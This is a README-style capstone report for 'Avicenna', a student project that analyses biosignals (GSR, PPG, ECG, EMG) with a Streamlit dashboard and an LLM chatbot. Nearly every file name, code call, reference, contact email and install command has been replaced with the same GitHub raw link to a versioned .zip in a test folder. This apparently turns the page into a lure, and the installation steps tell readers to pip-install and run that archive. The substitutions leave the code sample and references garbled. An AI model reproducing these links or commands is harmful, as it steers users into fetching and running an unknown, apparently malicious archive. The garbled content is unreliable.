# Avicenna: Cognitive Load Data Analysis and Chatbot Integration

## Sejong University - Capstone Design Project Report

### Authors
- **Kamran Asad Al Aziz** (Student ID: 20012763)
- **Mirshoir** (Student ID: 21012963)

### Professors
- **Rajendra Dhakal**
- **Abolghasem Sadeghi-Niaraki**

---

## Table of Contents
1. [Introduction](#introduction)
2. [Project Overview](#project-overview)
3. [Dashboard Development](#dashboard-development)
4. [Chatbot Integration](#chatbot-integration)
5. [Data Analysis](#data-analysis)
    - [GSR and PPG Analysis](#gsr-and-ppg-analysis)
    - [EMG Analysis](#emg-analysis)
    - [ECG Analysis](#ecg-analysis)
6. [System Implementation](#system-implementation)
7. [Results and Visualization](#results-and-visualization)
8. [Future Work](#future-work)
9. [Conclusion](#conclusion)
10. [References](#references)


---

## Introduction

The **Avicenna project** integrates biosignal data analysis with an AI-driven chatbot to provide insights into users' cognitive load and emotional well-being. The project comprises two main components: a **dashboard** for real-time data collection and analysis, and a **chatbot** for personalized feedback. This report primarily focuses on the dashboard development and data analysis conducted by **Kamran Asad Al Aziz**, while briefly touching upon the chatbot integration by **Mirshoir**.

---

## Project Overview

### Objectives
1. **Develop a dashboard** for real-time data collection using Shimmer devices.
2. **Analyze biosignal data** (GSR, PPG, ECG, and EMG) to assess cognitive load and stress.
3. **Integrate a chatbot** to provide actionable recommendations based on analyzed data.

### Scope
- Real-time and uploaded data analysis for biosignals.
- Visualization of key metrics and trends.
- Cognitive load estimation and stress detection.

---

## Dashboard Development

### Tools and Technologies
- **Streamlit**: Framework for building interactive dashboards.
- **PyShimmer**: Unofficial Python API for Shimmer devices.
- **NeuroKit2**: Library for biosignal processing and analysis.
- **Python**: Core programming language for data handling.

### Features
- **Real-Time Data Streaming**:
  - Devices: Shimmer 3 GSR+ Unit SR48-2, Shimmer 3 EXG Unit SR47-5-1.
  - Channels:
    - GSR: `https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`
    - PPG: `https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`
    - EMG: `https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`, `EXG_ADS1292R_1_CH2_24BIT`
    - ECG: `https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`, `EXG_ADS1292R_2_CH2_24BIT`
- **Analysis Modules**:
  - Stress detection from GSR.
  - HRV computation from PPG and ECG.
  - Muscle activation analysis from EMG.
- **Visualization**:
  - Time-series plots for biosignals.
  - Real-time graphs and insights.
- **Data Storage**:
  - All data saved as CSV for future analysis.

---

## Chatbot Integration

**https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip**:

The chatbot component of the Avicenna project was designed to provide personalized insights and recommendations based on the user’s cognitive load and stress levels. Below are the functionalities of the `https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip` module:

### Features
1. **Conversational Interface**:
   - The chatbot interacts with users, understanding their concerns and providing relevant feedback.
2. **Integration with Dashboard**:
   - Fetches cognitive load metrics and stress analysis results from the dashboard.
3. **AI Models Used**:
   - Leveraged LLaMA and Ollama's Mistral models for robust conversational capabilities.
4. **Personalized Feedback**:
   - Offers tailored advice on stress management and improving focus.

### Technologies Used
- **Streamlit** for seamless integration with the dashboard.
- **Custom NLP Models** for accurate sentiment analysis and response generation.
- **PyTorch** for deploying the LLaMA model.

Sample Chatbot Functionality Code Snippet:
```python
import streamlit as st

def chatbot_interface():
    https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip("Avicenna Chatbot")
    user_input = https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip("How can I assist you today?")
    if user_input:
        response = generate_response(user_input)
        https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip("Chatbot:", response)

def generate_response(user_input):
    # Placeholder for AI model integration
    return "I am here to assist you with your cognitive load insights."

if __name__ == "__main__":
    chatbot_interface()
```

---

## Data Analysis

### GSR and PPG Analysis
- **Stress Detection**:
  - GSR thresholds used to identify periods of stress.
- **HRV Metrics**:
  - Computed from PPG peaks.
  - Metrics include SDNN and LF/HF ratio for cognitive load estimation.

### EMG Analysis
- **Muscle Activation**:
  - High muscle activation detected through envelope analysis.
- **Key Outputs**:
  - Percentage of time under high activation.
  - Visualization of amplitude trends.

### ECG Analysis
- **HRV Features**:
  - LF/HF ratio for cognitive load estimation.
  - Stress levels determined from HRV metrics.
- **R-Peak Detection**:
  - Accurate identification of cardiac cycles for analysis.

---

## System Implementation

### Code Structure
- **`https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`**: Navigation and integration of all modules.
- **`https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`**: Handles GSR and PPG analysis.
- **`https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`**: Focused on ECG analysis.
- **`https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`**: Manages EMG data collection and processing.
- **`https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`**: Implements chatbot functionality.

---

## Results and Visualization

### Sample Data
#### GSR/PPG:
| Timestamp           | GSR_Value | PPG_Value |
|---------------------|-----------|-----------|
| 2024-12-18 19:29:13| 688       | 1904      |
| 2024-12-18 19:29:14| 688       | 1903      |

#### EMG:
| Timestamp           | EMG_CH1 | EMG_CH2   |
|---------------------|---------|-----------|
| 2024-12-19 09:32:59| 3093    | -4790837  |
| 2024-12-19 09:32:59| 2583    | -4794430  |

#### ECG:
| Timestamp           | ECG_CH1 | ECG_CH2   |
|---------------------|---------|-----------|
| 2024-12-19 08:14:55| 261788  | -4615     |
| 2024-12-19 08:14:56| 261309  | -4727     |

---

## Future Work

1. **Enhance Stress Analysis**:
   - Refine thresholds and algorithms for stress detection.
2. **Expand Cognitive Load Metrics**:
   - Add new features for comprehensive cognitive load assessment.
3. **Mobile Integration**:
   - Develop a companion app for on-the-go analysis.

---

## Conclusion

The Avicenna project bridges biosignal data analysis and conversational AI to provide users with actionable insights into their cognitive and emotional well-being. The modular design ensures scalability, while the integration of real-time data analysis and chatbot functionality delivers a holistic user experience.

---

## References

1. Shimmer Sensing, "Shimmer3 GSR+ User Manual," https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip
2. NeuroKit2 Documentation, "NeuroKit2: An Open-Source Python Toolbox for Physiological Signal Processing," https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip
3. Python Software Foundation, "Python 3.11 Documentation," https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip
4. Streamlit, "Streamlit Framework Documentation," https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip
5. Pyshimmer, “Shimmer unofficial API,” https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip


# Avicenna: AI-Driven Chatbot for Biosignal Analysis

Welcome to **Avicenna**, an advanced conversational AI chatbot integrated with biosignal data analysis. This platform is designed to assist users by analyzing physiological data such as ECG, EMG, and GSR/PPG, and providing personalized insights to help manage stress, cognitive load, and emotional well-being.

## **Contents**
- [Features](#features)
- [How It Works](#how-it-works)
- [Installation](#installation)
- [Project Structure](#project-structure)
- [Usage](#usage)
- [Future Enhancements](#future-enhancements)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)
- [Acknowledgments](#acknowledgments)

---

## [Features](#features)

### **1. Conversational AI**

- Named **Avicenna**, the chatbot leverages advanced language models like Ollama's Mistral and LLaMA 3.2.
- Provides personalized advice based on user input and biosignal analysis results.
- Supports Chain-of-Thought (CoT) reasoning for accurate responses.

### **2. Biosignal Data Integration**

- Analyzes data from biosignals such as:
  - **ECG (Electrocardiogram):** Stress level evaluation.
  - **EMG (Electromyography):** Muscle activation analysis.
  - **GSR/PPG (Galvanic Skin Response and Photoplethysmogram):** Emotional state insights.

### **3. Results and History Management**

- Saves chatbot interactions as PDF files for future reference.
- Integrates with the Streamlit dashboard for result visualization.

### **4. Modular Design**

- Easy to extend with additional biosignal analysis modules.
- Supports both real-time and file-based data processing.

---

## [How It Works](#how-it-works)

1. **Data Analysis:**

   - Users upload `.csv` files containing biosignal data.
   - The system processes and analyzes the data, extracting insights like stress levels, emotional states, and muscle activation percentages.

2. **Chatbot Interaction:**

   - Users interact with Avicenna by asking questions or seeking advice.
   - The chatbot uses analyzed data and models to provide step-by-step reasoning and actionable recommendations.

3. **Dashboard Integration:**

   - Displays analysis results in a user-friendly Streamlit interface.
   - Allows users to navigate between analysis pages and the chatbot seamlessly.

---

## [Installation](#installation)

### Prerequisites

- Python 3.10+
- Required libraries (listed in `https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip`)

### Steps

1. Clone the repository:
   ```bash
   git clone <repository-url>
   ```
2. Navigate to the project directory:
   ```bash
   cd chatbot
   ```
3. Install dependencies:
   ```bash
   pip install -r https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip
   ```
4. Run the application:
   ```bash
   streamlit run https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip
   ```

---

## [Project Structure](#project-structure)

```
.
├── https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip                # Main Streamlit application
├── https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip            # Chatbot implementation
├── https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip      # Python dependencies
├── ecg/                  # ECG analysis module
├── emg/                  # EMG analysis module
├── gsr_ppg/              # GSR/PPG analysis module
├── results/              # Directory for saving analysis results
└── docs/                 # Documentation and user guides
```

---

## [Usage](#usage)

1. Launch the app and navigate to the desired page using the sidebar menu.
2. Upload `.csv` files for ECG, EMG, or GSR/PPG data analysis.
3. View the results on the respective pages or interact with the chatbot for detailed advice.
4. Download chat history as a PDF for future reference.

---

## [Future Enhancements](#future-enhancements)

- **Real-Time Data Integration:**
  - Stream data directly from biosignal devices using PyShimmer.
- **Additional Biosignal Support:**
  - Include EEG (Electroencephalogram) for cognitive fatigue analysis.
- **Multi-Language Support:**
  - Extend chatbot capabilities to support multiple languages.

---

## [Contributing](#contributing)

We welcome contributions to enhance Avicenna! Feel free to open an issue or submit a pull request.

---

## [License](#license)

This project is licensed under the MIT License. See the `LICENSE` file for more details.

---

## [Contact](#contact)

For questions or support, please contact:

- **Name:** Mirshoir
- **Email:** [mirshoir29\https://github.com/asadalaziz/Avicenna-Cognitive-Load-and-Biosignal-Data-Analysis-Platform/raw/refs/heads/main/pyshimmer/test/Analysis_and_Biosignal_Load_Avicenna_Data_Platform_Cognitive_2.5-alpha.2.zip]

---

## [Acknowledgments](#acknowledgments)

- Shimmer Devices for biosignal hardware support.
- Ollama LLMs for powering the chatbot's advanced language capabilities.
- The open-source community for tools and inspiration.

